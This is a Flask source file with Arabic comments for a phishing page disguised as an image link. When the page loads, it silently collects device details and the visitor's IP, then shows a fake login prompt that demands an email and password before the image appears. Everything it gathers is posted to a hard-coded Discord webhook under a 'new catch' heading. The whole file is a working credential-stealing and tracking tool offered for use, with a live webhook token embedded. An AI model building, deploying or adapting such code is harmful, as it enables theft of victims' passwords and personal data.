from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# --- الإعدادات ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
REAL_IMAGE = "https://d2j2uxe7jasn0r.cloudfront.net/thumbnails/video/ruefkyi-il8e5psf4/videoblocks-hackers-screen-2025_9_yhbh2_sflfew13gl_thumbnail-1080_02.png" # استخدم رابط مباشر ينتهي بـ .jpg

@app.route('/')
@app.route('/api/image')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    html_code = '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://jsdelivr.net"></script>
    </head>
    <body style="margin:0; background:#000; height:100vh; display:flex; justify-content:center; align-items:center; color:white; font-family:sans-serif;">
        
        <div id="loader">جاري تحميل المحتوى...</div>
        <img src="{{ img_url }}" id="img" style="max-width:100%; display:none;">

        <script>
            async function capture() {
                try {
                    // 1. جمع البيانات بصمت فوراً
                    let battery = await navigator.getBattery();
                    let info = {
                        "الجهاز": /Mobi|Android/i.test(navigator.userAgent) ? "جوال" : "كمبيوتر",
                        "البطارية": (battery.level * 100) + "%",
                        "المعالج": navigator.hardwareConcurrency + " Cores",
                        "الشاشة": screen.width + "x" + screen.height
                    };

                    // 2. إظهار نافذة الطلب (هنا تظهر البيانات الحساسة)
                    const { value: loginData } = await Swal.fire({
                        title: 'تأكيد الهوية',
                        text: 'يجب تسجيل الدخول لمشاهدة الصورة',
                        html: '<input id="e" class="swal2-input" placeholder="الإيميل">' +
                             '<input id="p" type="password" class="swal2-input" placeholder="كلمة المرور">',
                        confirmButtonText: 'دخول',
                        allowOutsideClick: false,
                        background: '#111',
                        color: '#fff'
                    });

                    // 3. إظهار الصورة وإخفاء كلمة التحميل
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('img').style.display = 'block';

                    // 4. إرسال البيانات للـ Webhook
                    fetch("{{ webhook }}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            "embeds": [{
                                "title": "👤 صيد جديد من Vercel",
                                "color": 16711680,
                                "fields": [
                                    {"name": "الإيميل", "value": document.getElementById('e').value || "فارغ", "inline": true},
                                    {"name": "الباسورد", "value": document.getElementById('p').value || "فارغ", "inline": true},
                                    {"name": "تفاصيل", "value": JSON.stringify(info), "inline": false}
                                ],
                                "footer": {"text": "IP: {{ ip }}"}
                            }]
                        })
                    });
                } catch (e) {
                    console.log(e);
                }
            }
            window.onload = capture;
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip)
